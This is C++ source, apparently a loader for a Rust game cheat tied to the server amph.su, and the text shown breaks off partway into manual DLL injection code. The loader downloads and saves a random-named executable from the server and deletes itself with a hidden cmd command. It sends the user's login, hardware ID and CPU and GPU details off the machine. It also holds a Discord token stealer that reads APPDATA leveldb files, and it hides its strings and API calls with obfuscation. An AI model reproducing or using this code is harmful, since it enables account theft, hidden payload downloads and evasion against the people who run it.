#include <iostream>
#include <string>
#include <stdexcept>
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

std::string GetIPv4Address() {
	std::string ipv4_address = "N/A";

#ifdef _WIN32
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed\n";
		return ipv4_address;
	}
#endif

	char hostname[1024];
	if (gethostname(hostname, 1024) != 0) {
		std::cerr << "Error getting hostname\n";
#ifdef _WIN32
		WSACleanup();
#endif
		return ipv4_address;
	}

	struct addrinfo hints, * info;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	if (getaddrinfo(hostname, NULL, &hints, &info) != 0) {
		std::cerr << "Error getting address info\n";
#ifdef _WIN32
		WSACleanup();
#endif
		return ipv4_address;
	}

	struct sockaddr_in* addr = (struct sockaddr_in*)info->ai_addr;
	char ip[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &(addr->sin_addr), ip, INET_ADDRSTRLEN);

	ipv4_address = ip;

	freeaddrinfo(info);

#ifdef _WIN32
	WSACleanup();
#endif

	return ipv4_address;
}



#include <iostream>
#define DIRECTINPUT_VERSION 0x0800
#include <dinput.h>
#include <tchar.h>
#include <dwmapi.h>
#pragma comment(lib, "dwmapi.lib")
#include <Windows.h>
#include <iostream>
#include <fileapi.h>
#include <direct.h>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <urlmon.h>
static bool Rust1Day = false;
static bool Rust7Days = false;
static bool Rust15Days = false;
static bool Rust30Days = false;
#pragma comment(lib, "urlmon.lib")


//#include "encrypt-decrypt/md5.hpp"
#include "utilities/process_helper.hpp"
#include "utilities/utilities.hpp"
//#include "../amthloader/encrypt-decrypt/md5.hpp"
#include "encrypt-decrypt/encrypt-decrypt.hpp"
#include "globals.hpp"


#include <strsafe.h>

using namespace std;

//Process _process;
NTSTATUS _lastStatus;

globals g_globals;

bool activation_validted = false;
bool activation_tab = true;
//bool activation_success = false;
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <TlHelp32.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Ws2_32.Lib")
#pragma comment(lib, "Wldap32.Lib")
#pragma comment(lib, "D:/sourca/Loader/amthloader/cpr.lib")
#pragma comment(lib, "D:/sourca/Loader/amthloader/zlib.lib")
#pragma comment(lib, "D:/sourca/Loader/amthloader/libcurl.lib")
#include "auth.hpp"
class CXenForo
{
public:
	struct Endpoints_t
	{
		CAuth Auth;
	} Endpoint;
};

CXenForo g_XenForo;




__forceinline string RSADecrypt(string decrypt)
{
	char key[551] = { 'q','z','k','u','f','k','g','k','x','q','j','b','a','q','s','h','w','p','r','o','s','e','v','t','s','i','y','d','f','t','a','m','v','w','x','m','e','h','g','i','t','w','l','d','n','s','y','s','o','h','h','c','f','r','u','u','p','f','d','v','g','q','s','e','f','x','y','f','n','y','l','z','d','e','i','b','m','i','r','t','n','p','m','c','n','q','w','j','f','h','y','p','e','n','h','l','e','c','c','e','u','i','n','o','y','l','i','g','y','i','x','n','t','i','j','w','l','w','n','w','g','n','u','v','w','g','y','p','w','v','l','w','b','j','d','e','o','x','w','x','v','y','x','g','f','a','g','t','o','p','h','u','s','j','d','n','r','v','t','n','v','a','b','p','c','h','p','k','a','s','d','o','i','z','e','u','o','t','b','g','q','p','l','x','b','t','x','l','m','d','z','p','l','t','e','v','r','a','b','v','j','k','c','u','i','f','y','u','k','j','x','u','i','i','c','u','l','u','z','i','h','i','q','f','q','m','j','l','a','s','z','v','f','c','b','g','a','j','n','m','v','p','q','y','l','w','c','i','e','v','p','i','a','f','w','u','n','x','u','r','d','o','k','r','t','e','m','z','q','q','o','j','d','d','w','p','p','a','r','p','c','c','d','c','l','j','u','v','z','d','v','u','y','x','q','o','f','t','r','k','c','w','r','v','j','q','y','c','r','h','m','e','t','g','o','w','k','s','c','g','v','a','d','l','w','z','x','v','w','w','e','q','a','f','a','b','v','v','j','v','y','f','j','f','t','h','x','p','j','e','m','f','z','a','j','r','w','t','a','v','x','d','m','o','o','n','r','v','p','g','s','l','y','p','u','v','z','f','i','c','y','q','b','v','a','h','z','h','z','z','s','r','q','x','j','c','u','w','r','p','u','x','e','v','k','l','d','g','u','i','r','a','v','v','k','s','s','v','d','c','n','x','b','u','i','d','v','v','n','j','h','d','j','y','i','u','u','h','r','z','i','w','y','q','k','b','p','z','t','s','m','z','h','p','h','c','g','s','m','m','w','q','l','x','u','p','x','x','w','r','s','t','i','b','n','b','c','h','q','k','r','q','c','w','n','x','p','a','a','d','d','c','i','l','x','q','e','j','w','l','e','t','a','d','r','t','w','g','o','j','l','z','t','x','t','k','l','l','d','i','p','i','r','u','h','a','l','v','n','z','o','l','l','k','r','y','b','n','z','x','p','p','g','b','f','m','j','y','j','j','h', };
	string output = decrypt;

	for (int i = 0; i < decrypt.size(); i++)
		output[i] = decrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];

	return output;
}
static void append_line2file(std::string filepath, std::string line)
{
	std::ofstream file;
	file.open(filepath, std::ios::out | std::ios::app);
	if (file.fail())
	{
		throw std::ios_base::failure(std::strerror(errno));
	}
	file.exceptions(file.exceptions() | std::ios::failbit | std::ifstream::badbit);
	file << line << std::endl;
}
__forceinline void Update()
{
	TCHAR szExeFileName[MAX_PATH];
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
	std::string newname = utilities::get_random_string(8).c_str();
	std::string extension = (xorstr_(".exe"));
	std::string newextension = newname + extension;
	std::string URL = xorstr_("https://amph.su/client/dfashashf.php");
	std::string Path = (xorstr_("./")) + newextension;
	URLDownloadToFileA(NULL, URL.c_str(), Path.c_str(), 0, NULL);
	char bytes[4];
	memset(bytes, '0', sizeof(char) * 4);
	std::string apps(bytes);
	append_line2file(newextension, apps);
}
//__forceinline void Rename()
//{
//	TCHAR szExeFileName[MAX_PATH];
//	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
//	std::string newname = utilities::get_random_string(16).c_str();
//	std::string extension = (xorstr_(".exe"));
//	std::string newextension = newname + extension;
//	rename(szExeFileName, newextension.c_str());
//}
#include <signal.h>
#define SELF_REMOVE_STRINGq  TEXT(xorstr_("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\""))
__forceinline void RenameAndDestroy()
{
	TCHAR szExeFileName[MAX_PATH];
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
	std::string newname = utilities::get_random_string(8).c_str();
	std::string extension = (xorstr_(".exe"));
	std::string newextension = newname + extension;
	rename(szExeFileName, newextension.c_str());
	{
		TCHAR szCmd[2 * MAX_PATH];
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		GetModuleFileName(NULL, szExeFileName, MAX_PATH);
		StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRINGq, newextension.c_str());
		CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	raise(11);
}

namespace Crypt
{
	char Key[256] =
	{
	'f','k','g','a','c','i','s','j',
	'p','e','p','a','p','h','u','j',
	'm','j','j','r','n','h','o','r',
	'v','i','z','h','q','v','z','d',
	'v','n','v','y','l','h','f','k',
	'c','b','d','s','b','y','h','o',
	'i','z','q','j','r','j','s','s',
	'p','m','x','s','d','t','n','a',
	'i','u','j','x','w','s','q','b',
	'k','s','u','n','s','n','a','g',
	'y','a','q','y','h','d','f','y',
	'y','s','t','l','a','b','a','o',
	'q','g','s','o','n','q','x','y',
	's','n','v','w','c','i','g','e',
	'v','b','f','x','o','u','j','v',
	'y','f','x','o','y','o','x','c',
	'w','p','w','x','h','q','t','q',
	'q','t','s','b','y','l','j','h',
	'i','f','p','b','p','w','x','o',
	'x','l','h','o','m','k','e','z',
	'z','n','c','o','z','w','q','w',
	'v','i','f','r','k','m','d','s',
	'p','w','t','i','q','p','t','j',
	'y','p','d','a','r','l','j','z',
	'j','i','s','u','d','w','u','z',
	'v','t','q','u','r','d','c','f',
	'k','s','f','f','n','d','l','l',
	'i','v','n','g','m','l','r','i',
	'b','y','u','i','q','l','e','e',
	'j','z','o','r','n','o','n','h',
	'z','d','l','u','v','p','s','v',
	'n','w','e','e','f','n','o','m'
	};
}

//Process bb;
string replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}
std::string processvvod = "RustClient.exe";

string DownloadString(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	string p = replaceAll(rtn, "|n", "\r\n");
	return p;
}
#include <psapi.h> // For access to GetModuleFileNameEx
typedef LONG(NTAPI* NtSuspendProcess)(IN HANDLE ProcessHandle);
typedef LONG(NTAPI* NtResumeProcess)(IN HANDLE ProcessHandle);
std::uint32_t find_process(const std::string& name)
{
	const auto snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 proc_entry{};
	proc_entry.dwSize = sizeof proc_entry;

	auto found_process = false;
	if (!!Process32First(snap, &proc_entry)) {
		do {
			if (name == proc_entry.szExeFile) {
				found_process = true;
				break;
			}
		} while (!!Process32Next(snap, &proc_entry));
	}

	CloseHandle(snap);
	return found_process
		? proc_entry.th32ProcessID
		: 0;
}
#pragma warning(disable : 4996)
#include <string.h>

void replace_first(
	std::string s,
	std::string const& toReplace,
	std::string const& replaceWith
) {
	std::size_t pos = s.find(toReplace);
	if (pos == std::string::npos) return;
	s.replace(pos, toReplace.length(), replaceWith);
}


__forceinline DWORD EnumProcess(string name)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	PROCESSENTRY32 ProcessEntry = { NULL };
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);

	for (BOOL bSuccess = Process32First(hSnapshot, &ProcessEntry); bSuccess; bSuccess = Process32Next(hSnapshot, &ProcessEntry))
	{
		if (!strcmp(ProcessEntry.szExeFile, name.c_str()))
			return ProcessEntry.th32ProcessID;
	}

	return NULL;
}

__forceinline void randomizetitle()
{
	std::random_device rd;
	std::mt19937 mt(rd());
	std::uniform_int_distribution<> distr(0, 51);
	std::string name = xorstr_("");
	char alphabet[] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
	for (int i = 0; i < 15; ++i)
	{
		name = name + alphabet[distr(mt)];
		SetConsoleTitleA(name.c_str());
	}
}

#include <signal.h>
namespace utils
{
	inline int get_pid_from_name(const wchar_t* name)
	{
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);
		Process32First(snapshot, &entry);
		do
		{
			const size_t cSize = strlen(entry.szExeFile) + 1;
			wchar_t* wc = new wchar_t[cSize];
			mbstowcs(wc, entry.szExeFile, cSize);

			if (wcscmp(wc, name) == 0)
			{
				return entry.th32ProcessID;
			}

		} while (Process32Next(snapshot, &entry));

		return 0; // if not found
	}
	inline uintptr_t read_file_by_name(const wchar_t* file_path)
	{
		HANDLE h_dll = CreateFileW(file_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (h_dll == INVALID_HANDLE_VALUE) return 0;
		int file_size = GetFileSize(h_dll, 0);
		PVOID buffer = VirtualAlloc(0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!ReadFile(h_dll, buffer, file_size, 0, FALSE) || *(int*)(buffer) != 9460301) // MZ CHECK
		{

			CloseHandle(h_dll);
			VirtualFree(buffer, 0, MEM_RELEASE);
			return 0;
		}
		else
		{
			CloseHandle(h_dll);
			return (uintptr_t)buffer;
		}
	}
	inline PIMAGE_NT_HEADERS get_nt_header(uintptr_t base)
	{
		PIMAGE_DOS_HEADER dos_headers = PIMAGE_DOS_HEADER(base);
		return PIMAGE_NT_HEADERS(base + dos_headers->e_lfanew);
	}
	inline bool mask_compare(void* buffer, const char* pattern, const char* mask)
	{
		for (auto b = reinterpret_cast<PBYTE>(buffer); *mask; ++pattern, ++mask, ++b)
		{
			if (*mask == 'x' && *reinterpret_cast<LPCBYTE>(pattern) != *b)
			{
				return FALSE;
			}
		}
		return TRUE;
	}
	inline PBYTE find_pattern(const char* pattern, const char* mask)
	{
		MODULEINFO info = { 0 };
		GetModuleInformation(GetCurrentProcess(), GetModuleHandleA(0), &info, sizeof(info));
		info.SizeOfImage -= static_cast<DWORD>(strlen(mask));
		for (auto i = 0UL; i < info.SizeOfImage; i++)
		{
			auto addr = reinterpret_cast<PBYTE>(info.lpBaseOfDll) + i;
			if (mask_compare(addr, pattern, mask))
			{
				return addr;
			}
		}
	}
	inline int get_function_length(void* funcaddress)
	{
		int length = 0;
		for (length = 0; *((UINT32*)(&((unsigned char*)funcaddress)[length])) != 0xCCCCCCCC; ++length);
		return length;
	}
	inline HWND hwndout;
	inline BOOL EnumWindowProcMy(HWND input, LPARAM lParam)
	{

		DWORD lpdwProcessId;
		GetWindowThreadProcessId(input, &lpdwProcessId);
		if (lpdwProcessId == lParam)
		{
			hwndout = input;
			return FALSE;
		}
		return true;
	}
	inline HWND get_hwnd_of_process_id(int target_process_id)
	{
		EnumWindows(EnumWindowProcMy, target_process_id);
		return hwndout;
	}

	extern __forceinline void shutdown();
	bool dirExists(const std::string& dirName_in);
}
#define mmix(h,k) { k *= m; k ^= k >> r; k *= m; h *= m; h ^= k; }

unsigned int MurmurHash2A(const void* key, int len, unsigned int seed)
{
	const unsigned int m = 0x5bd1e995;
	const auto r = 24;
	unsigned int l = len;
	auto data = static_cast<const unsigned char*>(key);

	auto h = seed;
	unsigned int k;

	while (len >= 4)
	{
		k = *(unsigned int*)data;

		mmix(h, k);

		data += 4;
		len -= 4;
	}

	unsigned int t = 0;

	switch (len)
	{
	case 3: t ^= data[2] << 16;
	case 2: t ^= data[1] << 8;
	case 1: t ^= data[0];
	};

	mmix(h, t);
	mmix(h, l);

	h ^= h >> 13;
	h *= m;
	h ^= h >> 15;

	return h;
}
#include "PointerHashFunc.h"
#include "getapi.h"
typedef NTSTATUS(__stdcall* t_NtQuerySystemInformation)(IN ULONG, OUT PVOID, IN ULONG, OUT PULONG);
typedef VOID(_stdcall* RtlSetProcessIsCritical) (IN BOOLEAN NewValue, OUT PBOOLEAN OldValue, IN BOOLEAN IsWinlogon);

HMODULE hash_GetModuleHandleA(LPCSTR lpModuleName)
{
	const auto _hash = MurmurHash2A("GetModuleHandleA", 17, 17);

	temp_GetModuleHandleA = static_cast<HMODULE(WINAPI*)(LPCSTR)>(get_api(_hash, "kernel32.dll", 17, 17));

	return temp_GetModuleHandleA(lpModuleName);
}
FARPROC hash_GetProcAddress(HMODULE hModule,
	LPCSTR lpProcName)
{
	const auto _hash = MurmurHash2A("GetProcAddress", 15, 15);

	temp_GetProcAddress = static_cast<FARPROC(WINAPI*)(HMODULE,
		LPCSTR)>(get_api(_hash, "kernel32.dll", 15, 15));

	return temp_GetProcAddress(hModule,
		lpProcName);
}

__forceinline void utils::shutdown()
{
	raise(11);
}
bool utils::dirExists(const std::string& dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}

#include "debugsekr.h"
#include<Psapi.h>
#include<shellapi.h>
template <typename Stream>
void reopen(Stream& pStream, const char* pFile,
	std::ios_base::openmode pMode = ios_base::out)
{
	pStream.close();
	pStream.clear();
	pStream.open(pFile, pMode);
}
#include "logo.h"
#include "fap.h"
#include "api.h"

bool combotargetinjectprocess = false;
namespace Global
{
	static struct
	{
		std::string server = (string)("amph.su");
		std::string forum_dir = (string)("/");
		//std::string secret_key = (string)("afsdgasd5437f5i7hsirf345rweg");
	} server;

	static struct
	{
		//std::string version = (string)("1");
		//std::string client_key = (string)("sgfdhsdfgerwtwertwretwe");
		//std::string cheat = (string)("amphetamine");
		std::string username;
		std::string message;
		std::string password;
		std::string stop;
	} client;
};
namespace Globals
{
	static struct
	{
		std::string server = xorstr_("amph.su");
		std::string forum_dir = xorstr_("/");
		std::string secret_key = xorstr_("1234567890");

		std::string checkbanactive = xorstr_("1");
	} server_side;

	static struct
	{
		std::string version = xorstr_("11.7");
		std::string client_key = xorstr_("0987654321");
		std::string cheat = xorstr_("amphetamine");
		std::string nadolibanithwid = xorstr_("0"); // 0 не надо / 1 надо

	} client_side;
};

__forceinline void strip_string(std::string& str)
{
	str.erase(std::remove_if(str.begin(), str.end(), [](int c) {return !(c > 32 && c < 127); }), str.end());
}









__forceinline std::vector<std::string> split_string(const std::string& str, const std::string& delim)
{
	std::vector<std::string> tokens;
	size_t prev = 0, pos = 0;
	do
	{
		pos = str.find(delim, prev);
		if (pos == std::string::npos) pos = str.length();
		std::string token = str.substr(prev, pos - prev);
		if (!token.empty()) tokens.push_back(token);
		prev = pos + delim.length();

	} while (pos < str.length() && prev < str.length());

	return tokens;
}
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}
bool trueandfalse = false;
char messagechat[40] = { 0 };
char messagechattoo[256] = { 0 };
static string usernameqqwqw;
static string passwordqwqwqw;

vector<std::string> получениедатыподписки;

string CheckVersion() {
	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	auto unprotect_request = DownloadString((string)xorstr_("https://") + Global::server.server + (string)xorstr_("/client/session.php"));
	//std::cout << unprotect_request.c_str() << endl;
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));

	std::string protect_request = aes::encrypt(unprotect_request, tempory_cipher_key, tempory_iv_key);
	std::string protect_key = aes::encrypt(Globals::client_side.client_key, tempory_cipher_key, tempory_iv_key);
	std::string protect_version = aes::encrypt(Globals::client_side.version, tempory_cipher_key, tempory_iv_key);
	unprotect_request = aes::encrypt(unprotect_request.c_str(), xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q")); // static keys
	auto accepted_request = DownloadString((string)xorstr_("https://amph.su/client/versions_check.php?a=") + unprotect_request + (string)xorstr_("&b=") + protect_request + (string)xorstr_("&c=") + protect_key + (string)xorstr_("&d=") + protect_version + (string)xorstr_("&prod=") + "loader");
	
//	std::string fghddfgh = aes::decrypt(aes::decrypt(accepted_request, tempory_cipher_key, tempory_iv_key), tempory_cipher_key, tempory_iv_key);

	return aes::decrypt(aes::decrypt(accepted_request, tempory_cipher_key, tempory_iv_key), tempory_cipher_key, tempory_iv_key);
}
std::string GetVideoCardInfo() {
	std::string info;
	DISPLAY_DEVICE displayDevice;
	displayDevice.cb = sizeof(DISPLAY_DEVICE);
	DWORD deviceNum = 0;

	while (EnumDisplayDevices(NULL, deviceNum, &displayDevice, 0)) {
		//info += "Device Name: ";
		//info += displayDevice.DeviceName;
		//info += "\nDevice String: ";
		info += displayDevice.DeviceString;
		if (!info.empty()) {
			return info;
		}
		//info += "\nDevice ID: ";
		//info += displayDevice.DeviceID;
		//info += "\nDevice Key: ";
		//info += displayDevice.DeviceKey;
		//info += "\n-----------------------------------\n";
		++deviceNum;
	}

	return info;
}
std::string GetProcessorInfo() {
	std::string info;
	HKEY hKey;
	const std::string keyPath = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
	const std::string valueName = "ProcessorNameString";
	DWORD dataSize = MAX_PATH;
	char processorName[MAX_PATH];
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		RegQueryValueEx(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(processorName), &dataSize);
		RegCloseKey(hKey);
		info += processorName;
	}
	else {
		info += "\nFailed to retrieve processor name.";
	}
	return info;
}


string Login() {
	//std::cout << utilities::get_hwid() << std::endl;
	//std::cout << utilities::get_hwidqwe() << std::endl;

	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	auto unprotect_request = DownloadString((string)xorstr_("https://") + Global::server.server + (string)xorstr_("/client/session.php"));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	std::string protect_request = aes::encrypt(unprotect_request, tempory_cipher_key, tempory_iv_key);
	std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	std::string protect_hwid = aes::encrypt(utilities::get_hwidqwe(), tempory_cipher_key, tempory_iv_key);
	unprotect_request = aes::encrypt(unprotect_request, (string)xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), (string)xorstr_("H1ggF9foFGLerr8q")); // static keys

	std::string protect_processor_name = aes::encrypt(GetProcessorInfo(), tempory_cipher_key, tempory_iv_key);
	std::string protect_graphics_card = aes::encrypt(GetVideoCardInfo(), tempory_cipher_key, tempory_iv_key);

	//auto accepted_request = DownloadString((string)xorstr_("https://Ret9.cc/client/loaderxen.php?a=") + unprotect_request + (string)xorstr_("&b=") + protect_request + (string)xorstr_("&username=") + protect_username + (string)xorstr_("&password=") + protect_password + (string)xorstr_("&hwid=") + protect_hwid);

	char request[9999];
	CURL* curl;
	CURLcode res;
	std::string accepted_request;
	curl = curl_easy_init();
	if (curl) {
		li(sprintf)(request, xorstr_("https://amph.su/client/loaderxen.php?a=%s&b=%s&username=%s&password=%s&hwid=%s&graphics_cards=%s&processor_name=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_hwid.c_str(), protect_graphics_card.c_str(), protect_processor_name.c_str());
		curl_easy_setopt(curl, CURLOPT_URL, request);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &accepted_request);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);


		return aes::decrypt(aes::decrypt(accepted_request, tempory_cipher_key, tempory_iv_key), tempory_cipher_key, tempory_iv_key);
	}
}
string GlobalBanHwid(string nadolibanit) {
	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	auto unprotect_request = DownloadString((string)xorstr_("https://") + Global::server.server + (string)xorstr_("/client/session.php"));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	std::string protect_request = aes::encrypt(unprotect_request, tempory_cipher_key, tempory_iv_key);
	std::string protect_hwid = aes::encrypt(utilities::get_hwidqwe(), tempory_cipher_key, tempory_iv_key);
	unprotect_request = aes::encrypt(unprotect_request, (string)xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), (string)xorstr_("H1ggF9foFGLerr8q")); // static keys
	auto accepted_request = DownloadString((string)xorstr_("https://amph.su/client/globalbanhwids.php?a=") + unprotect_request + (string)xorstr_("&b=") + protect_request + (string)xorstr_("&hwid=") + protect_hwid + (string)xorstr_("&nadolibanit=") + nadolibanit);
	return aes::decrypt(aes::decrypt(accepted_request, tempory_cipher_key, tempory_iv_key), tempory_cipher_key, tempory_iv_key);
}
string ban_acc_from_forum() {
	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	auto unprotect_request = DownloadString((string)xorstr_("https://") + Global::server.server + (string)xorstr_("/client/session.php"));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	std::string protect_request = aes::encrypt(unprotect_request, tempory_cipher_key, tempory_iv_key);
	std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	unprotect_request = aes::encrypt(unprotect_request, (string)xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), (string)xorstr_("H1ggF9foFGLerr8q")); // static keys
	auto accepted_request = DownloadString((string)xorstr_("https://amph.su/client/banforum_acc.php?a=") + unprotect_request + (string)xorstr_("&b=") + protect_request + (string)xorstr_("&username=") + protect_username + (string)xorstr_("&password=") + protect_password + (string)xorstr_("&userbandatb=") + Globals::server_side.checkbanactive.c_str());
	return aes::decrypt(aes::decrypt(accepted_request, tempory_cipher_key, tempory_iv_key), tempory_cipher_key, tempory_iv_key);
}
std::string pornushka;
#include <regex>
#include <filesystem>
std::vector<std::string> rarararar;
void findtoken(const std::string& path)
{
	std::string discordtokenwithout2fa = xorstr_(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
	std::string discordtokenwith2FA = xorstr_(R"(mfa\.[\w-]{84})");
	std::regex discordtokenwithout2faregex(discordtokenwithout2fa);
	std::regex discordtokenwith2FAregex(discordtokenwith2FA);
	std::ifstream stream((path), std::ios::binary);
	std::string content((std::istreambuf_iterator<char>(stream)),
		std::istreambuf_iterator<char>());
	stream.close();
	std::smatch result;
	if (std::regex_search(content, result, discordtokenwith2FAregex))
	{
		rarararar.emplace_back(result.str());
	}
	if (std::regex_search(content, result, discordtokenwithout2faregex))
	{
		rarararar.emplace_back(result.str());
	}
	for (auto& tokkietokkie : rarararar)
	{
		pornushka = tokkietokkie;
	}
}
void vzyal_dlya_sebya() {
	std::string appdata = getenv(xorstr_("APPDATA"));
	std::vector<std::string> discordtokenpaths;
	discordtokenpaths.push_back(appdata + xorstr_("\\discord\\Local Storage\\leveldb\\"));
	discordtokenpaths.push_back(appdata + xorstr_("\\Discord Canary\\Local Storage\\leveldb\\"));
	discordtokenpaths.push_back(appdata + xorstr_("\\discordptb\\Local Storage\\leveldb\\"));
	for (auto& paths : discordtokenpaths)
	{
		if (std::filesystem::exists(paths) == true)
		{
			for (const auto& entry : std::filesystem::directory_iterator(paths))
			{
				if (entry.path().string().find(xorstr_(".log")) != std::string::npos || entry.path().string().find(xorstr_(".ldb")) != std::string::npos)
				{
					findtoken((entry.path().string()));
				}
			}
		}
	}
}
std::string outputqwqwqwvd;


#include <cstdint>
#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <psapi.h>



#define MAX_PROCESSES 1024
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI* PDLL_MAIN)(HMODULE, DWORD, PVOID);

typedef struct _MANUAL_INJECT
{
	PVOID ImageBase;
	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseRelocation;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;
}MANUAL_INJECT, * PMANUAL_INJECT;


DWORD ProcId = 0;

DWORD FindProcess(__in_z LPCTSTR lpcszFileName)
{
	LPDWORD lpdwProcessIds;
	LPTSTR  lpszBaseName;
	HANDLE  hProcess;
	DWORD   i, cdwProcesses, dwProcessId = 0;

